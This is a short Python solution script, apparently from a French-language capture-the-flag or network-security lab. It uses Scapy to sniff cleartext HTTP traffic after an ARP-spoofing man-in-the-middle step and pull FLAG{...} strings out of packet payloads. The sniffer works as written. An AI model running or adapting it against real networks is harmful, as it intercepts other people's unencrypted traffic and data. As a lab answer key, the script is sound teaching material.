#!/usr/bin/env python3
"""
Correction C3 — MITM contre HTTP (extraction du flag par sniffing Scapy).

À exécuter APRÈS s'être placé en homme-du-milieu (arp_spoof.py) et avec le
routage IP activé. Reniffle le TCP de la cible et extrait tout FLAG{...} présent
en clair dans les charges HTTP (le flux n'étant pas chiffré).

  sudo python3 sniff_http_flag.py --port 8453 --iface eth0
"""
import argparse
import re

from scapy.all import Raw, TCP, sniff  # type: ignore

FLAG_RE = re.compile(rb"FLAG\{[^}]+\}")
_found: set[bytes] = set()


def _handle(pkt) -> None:
    if not pkt.haslayer(Raw):
        return
    for m in FLAG_RE.findall(bytes(pkt[Raw].load)):
        if m not in _found:
            _found.add(m)
            print("[+] FLAG capturé :", m.decode())


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8453)
    ap.add_argument("--iface", default=None)
    a = ap.parse_args()
    print(f"[*] sniffing TCP/{a.port} — en attente du relevé de la victime…")
    sniff(filter=f"tcp port {a.port}", prn=_handle, store=False, iface=a.iface)


if __name__ == "__main__":
    main()
